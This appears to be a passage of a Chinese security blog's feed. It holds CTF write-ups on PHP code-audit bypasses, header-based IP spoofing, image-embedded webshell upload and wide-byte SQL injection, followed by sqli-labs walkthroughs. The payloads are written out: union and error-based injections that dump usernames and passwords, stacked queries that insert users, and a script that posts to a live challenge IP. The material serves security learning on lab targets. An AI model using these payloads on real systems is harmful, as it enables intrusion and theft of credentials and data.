if(!preg_match(&quot;/^\w+$/&quot;,$args))&#123;</span><br><span class="line">        die(&quot;args error!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    eval(&quot;var_dump($$args);&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>附上源码<br>PHP自动化的全局变量：**$GLOBALS** —— 引用全局作用域中可用的全部变量，一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p><p>正则表达式”&#x2F;^\w+$&#x2F;“，匹配字符串，\w表示字符+数字+下划线{ a-z,A-Z,_,0-9 }。如果不匹配会输出 ‘’args error!‘’\</p><p>两个<code>/``/</code> 表明正则表达式的开始与结束，<code>^</code>开始字符，<code>$</code>结束字符，<code>+</code>代表可以有一个或多个<code>\w</code>。</p><p>PHP中变量可以当作另一个变量的变量名：$$args，结合第一句flag In the variable !</p><p>所以构造payload：URL?args&#x3D;GLOBALS</p><p>即可爆出所有args，其中包含flag。<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-75d20ffb204d8b27.png" alt="img"></p><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><h4 id="【代码审计】之数组绕过"><a href="#【代码审计】之数组绕过" class="headerlink" title="【代码审计】之数组绕过"></a>【代码审计】之数组绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag3.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">areyouok</span>(<span class="params"><span class="variable">$greeting</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/Wpsec.*Good/is&#x27;</span>,<span class="variable">$greeting</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$greeting</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;greeting&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$greeting</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">areyouok</span>(<span class="variable">$greeting</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$greeting</span>,<span class="string">&#x27;Wpsec Good&#x27;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Wpsec Good. &#x27;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Do you know php?&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Do you really know PHP?&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>附上源码<br>PHP strpos() 函数:查找 “php” 在字符串中第一次出现的位置：<br><strong>eg:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strpos</span>(<span class="string">&quot;You love php, I love php too!&quot;</span>,<span class="string">&quot;php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>要求post一个 greeting参数，经过areyouok函数正则过滤后如果返回false，<br>就进入下一个if，如果 greeting参数包含 Wpsec Good则打印flag。<br>可以利用strpos函数的一个漏洞，传入一个数组，会返回 NULL， NULL不强等于false，即可绕过。<br><strong>注：PHP函数中大部分无法处理数组</strong><br>构造payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">greeting= &amp;greeting[]=Wpsec Good</span><br></pre></td></tr></table></figure><h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-1998b612d083aad8.png" alt="img"></p><h4 id="F12——网络——消息头"><a href="#F12——网络——消息头" class="headerlink" title="F12——网络——消息头"></a>F12——网络——消息头</h4><h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><h4 id="【代码审计】之变量覆盖二"><a href="#【代码审计】之变量覆盖二" class="headerlink" title="【代码审计】之变量覆盖二"></a>【代码审计】之变量覆盖二</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">   <span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line">   <span class="variable">$_403</span> = <span class="string">&quot;Access Denied&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$_200</span> = <span class="string">&quot;Welcome Admin&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] != <span class="string">&quot;POST&quot;</span>)</span><br><span class="line">   &#123;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&quot;WPSEC-CTF is here :p...&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> ( !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;flag&quot;</span>]) )</span><br><span class="line">   &#123;</span><br><span class="line">         <span class="keyword">die</span>(<span class="variable">$_403</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">   &#123;</span><br><span class="line">         <span class="variable">$$key</span> = <span class="variable">$$value</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">   &#123;</span><br><span class="line">         <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> ( <span class="variable">$_POST</span>[<span class="string">&quot;flag&quot;</span>] !== <span class="variable">$flag</span> )</span><br><span class="line">   &#123;</span><br><span class="line">         <span class="keyword">die</span>(<span class="variable">$_403</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;This is your flag : &quot;</span>. <span class="variable">$flag</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">   <span class="keyword">die</span>(<span class="variable">$_200</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">WPSEC-CTF is here :p...</span><br></pre></td></tr></table></figure><p>附上源码<br>题目分析：</p><p>源码包含了flag.php文件，并且需要满足3个if 里的条件才能获取flag，题目中使用了两个foreach并且也使用了  <code>$$.</code>两个foreach中对<code>$$key</code>的处理是不一样的，满足条件后会将<code>$flag</code>里面的值打印出来，所以<code>$flag</code>是在flag.php文件文件中的。</p><p>但是由于<code>$flag</code>的值会被中间部分代码给覆盖掉，所以需要先将<code>$flag</code>的值赋给<code>$_200</code>或<code>$_403</code>变量，然后利用<code>die($_200)</code>或 die<code>($_403)</code>将flag打印出来。</p><p>两个foreach函数遍历数组函数，这里就是把我们用get方法传输的数据当做数组进行遍历，并将遍历的参数赋值给key，将参数值复制给value。<br>还有一个if判断语句，判断用post方法传输的数据是不是和<code>$flag</code>的值相同，如果相同，输出flag。<br>最后输出<code>$200</code>的内容。</p><p>解题方法：</p><p>由于第7，11-14行间的代码会将<code>$flag</code>的值给覆盖掉，所以只能利用第一个foreach先将<code>$flag</code>的值赋给<code>$_200</code>，然后利用<code>die($_200)</code>将原本的flag值打印出来。</p><p>最终PAYLOAD：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET DATA：?_200=flag </span><br><span class="line"></span><br><span class="line">POST DATA：flag=1</span><br></pre></td></tr></table></figure><h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><h4 id="IP伪造-密码学"><a href="#IP伪造-密码学" class="headerlink" title="IP伪造+密码学"></a>IP伪造+密码学</h4><p>IP伪造的方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For</span><br><span class="line">Client-IP</span><br><span class="line">x-remote-IP</span><br><span class="line">x-originating-IP</span><br><span class="line">x-remote-addr</span><br></pre></td></tr></table></figure><p>解题：<br>用burp进行抓包，前提是先输入账户密码，一般我们使用账户admin,密码随意，抓包后进行ip伪造，<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-1669dcf5fcef0c4a.png" alt="img"></p><h4 id="注意这里的IP为题目上提到的，并不是本地的"><a href="#注意这里的IP为题目上提到的，并不是本地的" class="headerlink" title="注意这里的IP为题目上提到的，并不是本地的"></a>注意这里的IP为题目上提到的，并不是本地的</h4><p>之后，send to repeater,运行后发现，<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-3108c4097067f30f.png" alt="img"><br>rot13这里用到密码学，解码后发现，jcfrp&#x3D;wpsec，很显然，这就是密码，不难想到，只有账户和密码同时正确，并且ip伪造成功，才能得到我们的flag，故输入admin,wpsec，后抓包，ip伪造，得到<strong>FLAG</strong><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-27043b0525cb0d03.png" alt="img"></p><h2 id="8"><a href="#8" class="headerlink" title="8"></a>8</h2><p>文件上传，这里需要提到<a href="https://l0ki.top/archives/88/">如何在图片中插入一句话木马</a><br>上传时借助抓包工具，<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-807e5a7dd615b804.png" alt="img"><br>这里我们需要修改**“2.jpg”为”2.php”**方可绕过，拿到flag,<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-2e23303ea2bbae51.png" alt="img"></p><h2 id="9"><a href="#9" class="headerlink" title="9"></a>9</h2><h4 id="sql注入之宽字节注入"><a href="#sql注入之宽字节注入" class="headerlink" title="sql注入之宽字节注入"></a>sql注入之宽字节注入</h4><p>这里我们需要用到%df’,类似于sql-lab-less32吧，<br>尝试注入<code>?id=0%df&#39; union select 1,1,1--+</code></p><h4 id="注意这里过滤了-注释，故我们可以使用其他的注释"><a href="#注意这里过滤了-注释，故我们可以使用其他的注释" class="headerlink" title="注意这里过滤了#注释，故我们可以使用其他的注释"></a>注意这里过滤了#注释，故我们可以使用其他的注释</h4><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-5ccdcb4972a486c5.png" alt="img"></p><p>接下来就直接放payload:<br>爆库:<br><code>?id=0%df&#39; union select 1,1,database()--+</code><br>爆表:<br><code>?id=0%df&#39; union select 1,1,group_concat(table_name) from information_schema.tables where table_schema=database()--+</code><br>爆值:<br><code>?id=0%df&#39; union select 1,1,group_concat(flag) from test.flag--+</code><br><strong>注意：这里由于限制了 ‘ 我们无法用常用的语句，如 “table_name&#x3D;’flag’，这样无法绕过</strong><br>最终拿到<strong>FLAG</strong></p><h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;flag2.php&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line">  <span class="variable">$flag</span> = <span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$gift</span>)) </span><br><span class="line">  &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$flag</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$gift</span> == <span class="variable">$content</span>) </span><br><span class="line">    &#123;</span><br><span class="line">     </span><br><span class="line">       <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">       &#123;<span class="variable">$a</span> = <span class="string">&#x27;huahuishishabi&#x27;</span>;</span><br><span class="line">        @<span class="title function_ invoke__">parse_str</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span>[<span class="number">0</span>] != <span class="string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>[<span class="number">0</span>]) == <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;QNKCDZO&#x27;</span>)) </span><br><span class="line">        &#123;</span><br><span class="line">                 <span class="keyword">echo</span> <span class="variable">$theflag</span>;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">          <span class="keyword">exit</span>(<span class="string">&#x27;oh...no..&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&#x27;oh..no.no..&#x27;</span>; </span><br><span class="line">        &#125;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125; </span><br><span class="line">       <span class="keyword">else</span> </span><br><span class="line">      &#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;Oh..&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">Oh..</span><br></pre></td></tr></table></figure><p>附上源码<br>PHP trim() 函数：移除字符串两侧的空白字符或其他预定义字符。<br>PHP extract() 函数：从数组中将变量导入到当前的符号表。<br>PHP parse_str() 函数:把查询字符串解析到变量中。<br>题目分析：<br>第一个if GET传flag 和 gift 的值，如果弱类型相等即可执行结下了的语句<br>第二个if POST传id,如果id的值等于a[0]，a[0]的值等于md5加密后与QNKCDZO加密后一样，即都为0e开头的即可<br>整理一下思路：首先要求使用GET提交flag和gift参数，其次用POST提交id参数，然后<code>parse_str($id)</code>对id参数的数据进行处理，再使用判断<code>$a[0] != ‘QNKCDZO’ &amp;&amp; md5($a[0]) == md5(‘QNKCDZO’)</code>的结果是否为真，为真就返回flag，md5(‘QNKCDZO’)的结果是0e830400451993494058024219903391由于此次要满足<code>$a[0] != ‘QNKCDZO’ &amp;&amp; md5($a[0]) == md5(‘QNKCDZO’)</code>所以要利用php弱语言特性，0e123会被当做科学计数法，0 * 10 x 123。所以需要找到一个字符串md5后的结果是0e开头后面都是数字的，如，240610708，s878926199a</p><h5 id="这里用到PHP处理0e开头md5哈希字符串缺陷-bug"><a href="#这里用到PHP处理0e开头md5哈希字符串缺陷-bug" class="headerlink" title="这里用到PHP处理0e开头md5哈希字符串缺陷&#x2F;bug"></a>这里用到<a href="http://www.cnblogs.com/Primzahl/p/6018158.html">PHP处理0e开头md5哈希字符串缺陷&#x2F;bug</a></h5><p>解题过程：<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-a4f16b76fde8717c.png" alt="img"></p><h2 id="11"><a href="#11" class="headerlink" title="11"></a>11</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag4.php&quot;;</span><br><span class="line">highlight_file(__file__);</span><br><span class="line">function areyouok($greeting)&#123;</span><br><span class="line">    return preg_match(&#x27;/Wpsec.*Good/is&#x27;,$greeting);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$greeting=@$_POST[&#x27;greeting&#x27;];</span><br><span class="line">if(!is_array($greeting))&#123;</span><br><span class="line">    if(!areyouok($greeting))&#123;</span><br><span class="line">        if(strpos($greeting,&#x27;Wpsec Good&#x27;)!==false)&#123;</span><br><span class="line">            echo &#x27;Wpsec Good. &#x27;.$flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &#x27;Do you know php?&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;Do you really know PHP?&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">Do you know php?</span><br></pre></td></tr></table></figure><p>附上源码<br>题目分析：<br>这道题与前面的一道题类似<br>但是加上了is_array的判断，不允许使用数组来绕过。<br>所以那道题的思路不能再用了。 这里需要用到正则回溯，可以参考大牛的文章：<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a><br>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限 pcre.backtrack_limit，默认为100万。当正则回溯超过这个上限时，就会返回false。<br>因此我们只要post100万个字符，让它回溯大于100万次，函数就会返回false，从而绕过if判断。<br>解题思路：<br>这里我直接上传了脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">data = &#123;&quot;greeting&quot;:&quot;Wpsec Good&quot; + &quot;aaaaa&quot; * 1000000&#125;</span><br><span class="line">res = requests.post(&#x27;http://47.93.6.132:5002/phpgood2.php&#x27;, data=data)</span><br><span class="line">print (res.content)</span><br></pre></td></tr></table></figure><p>结果<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-91f8161963307e05.png" alt="img"></p><p>当然还有另一种解题思路，但是比较麻烦<br>直接POST <code>greeting=Wpsec Good (后面省略一百万个字符）</code></p><h2 id="12"><a href="#12" class="headerlink" title="12"></a>12</h2><p>这道300分的题一看就不简单，题目名字sqlsql，故推断需要进行两次注入<br>第一次注入，其实和sql-lab-less24题很像。<br>解题思路：<br>我们先利用注册，进行注册<code>username:admin&#39;#,password:123</code><br>接着根据经验，这时候修改密码，修改后的密码便是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username:admin的密码</span><br></pre></td></tr></table></figure><p>登陆后，发现后台提示table:flag,tolumn:flag，不难想到，表名，列名，但是用这个信息注入还不行，<br>因为delete过滤了太多<br>这道题的过滤点 union where or 对我们构成必要的sql语句造成了不便，这时候我们可以用&#x2F;**&#x2F;<br>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">un/**/ion </span><br><span class="line">whe/**/re </span><br><span class="line">o/**/r</span><br></pre></td></tr></table></figure><p>但是由于只是储备有限，最终未能拿到flag，不过据说需要用脚本跑。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>How to Insert a Sentence into a Picture in Win10</title>
      <link href="/2019/02/27/How-to-Insert-a-Sentence-into-a-Picture-in-Win10/"/>
      <url>/2019/02/27/How-to-Insert-a-Sentence-into-a-Picture-in-Win10/</url>
      
        <content type="html"><![CDATA[<p>首先我们准备一张像素比较小的图片，命名为11.jpg<br>然后新建一个txt文件，更改名称为1.txt，输入代码。</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-963c4197e06e4440.png" alt="img"></p><p>使用windos + r键弹出windows运行框输入cmd调出命令提示框。<br>执行命令copy 11.jpg&#x2F;b + 1.txt&#x2F;a 2.jpg 前两个文件合并成一个文件，文件属性为2.jpg。</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-967b195f90176640.png" alt="img"></p><p>找到2.jpg更改扩展名为2.txt，查看代码</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-3022e3a17eab324f.png" alt="img"></p><p>插入成功！</p>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sql Lab(41-65)</title>
      <link href="/2019/02/26/sql-lab(41-65)/"/>
      <url>/2019/02/26/sql-lab(41-65)/</url>
      
        <content type="html"><![CDATA[<h2 id="less-41"><a href="#less-41" class="headerlink" title="less-41"></a>less-41</h2><p>只有输入id&#x3D;1才会出现回显，尝试输入 ?id&#x3D;0 union select 1,1,1 成功回显</p><h3 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0 union select 1,1,database()</span><br></pre></td></tr></table></figure><h3 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0 union select 1,1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;</span><br></pre></td></tr></table></figure><h3 id="爆列"><a href="#爆列" class="headerlink" title="爆列"></a>爆列</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0 union select 1,1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;</span><br></pre></td></tr></table></figure><h3 id="爆值"><a href="#爆值" class="headerlink" title="爆值"></a>爆值</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0 union select 1,1,group_concat(username,password) from users</span><br></pre></td></tr></table></figure><h2 id="less-42"><a href="#less-42" class="headerlink" title="less-42"></a>less-42</h2><p>查看源码:<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-fe01f119370ecf88.png" alt="图片.png"><br>Password变量在post过程中，没有通过mysql_real_escape_string()函数的处理。<br>用户名可以随意填写，<br>密码我们可以构造进行注入。</p><h3 id="通过伪造表查看数据列名"><a href="#通过伪造表查看数据列名" class="headerlink" title="通过伪造表查看数据列名"></a>通过伪造表查看数据列名</h3><p>在密码栏填写:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27;;creat table less42 like users#</span><br></pre></td></tr></table></figure><p>创建成功后发现，users表中数据列名为<code>id,username,password</code><br>以此类推，只需插入数据(或者更新数据)即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27;;insert into users (username,password) values (&#x27;a&#x27;,&#x27;a&#x27;)#</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-010e54fb430d2601.png" alt="图片.png"></p><h2 id="less-43"><a href="#less-43" class="headerlink" title="less-43"></a>less-43</h2><p>先用同样的方法测试，就用less42的方法，<br>注入语句：a’;creat table less43 like users#<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-15f4100376a90b34.png" alt="图片.png"></p><p>发现报错<br>根据报错提示，只需在less-42的基础上加一个括号，即：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27;);creat table less43 like users#</span><br></pre></td></tr></table></figure><p>以此类推，同less-42</p><h2 id="less-44"><a href="#less-44" class="headerlink" title="less-44"></a>less-44</h2><p>同less-42,只不过没有报错回显，我们只能通过查看数据库来判断是否注入成功<br>通过测试，发现和less42一样。</p><h2 id="less-45"><a href="#less-45" class="headerlink" title="less-45"></a>less-45</h2><p>集结了less-44和less-43，即报错不回显，测试方法同less-44,盲注，观察数据库，注入方法和less-43一样。</p><h2 id="less-46"><a href="#less-46" class="headerlink" title="less-46"></a>less-46</h2><p><a href="http://www.cnblogs.com/lcamry/p/5762710.html">借鉴于博客</a><br>尝试?sort&#x3D;1 desc或者asc，显示结果不同，则表明可以注入。<br>爆表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-46/index.php?sort=extractvalue(1,concat(0x7e,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database())))%20--+</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-39e7ced625b92482.png" alt="图片.png"></p><p>爆列：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-46/index.php?sort=extractvalue(1,concat(0x7e,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27)))--+</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-e7bd63756f760f55.png" alt="图片.png"></p><p>爆值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost/sqli-labs/Less-46/index.php?sort=extractvalue(1,concat(0x7e,(select group_concat(username,password) from users)))--+</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-dbb269ebff6347c5.png" alt="图片.png"></p><h2 id="less-47"><a href="#less-47" class="headerlink" 